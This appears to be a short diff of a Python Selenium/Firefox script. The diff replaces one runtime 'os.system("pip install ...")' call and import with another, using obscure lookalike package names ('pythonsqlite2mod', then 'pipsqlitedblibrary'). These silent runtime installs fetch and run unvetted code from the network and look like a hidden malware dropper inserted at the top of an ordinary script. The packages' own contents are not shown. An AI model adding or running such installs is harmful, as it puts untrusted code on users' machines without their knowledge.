@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlite2mod")
-import pythonsqlite2mod
+os.system("pip install pipsqlitedblibrary")
+import pipsqlitedblibrary
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
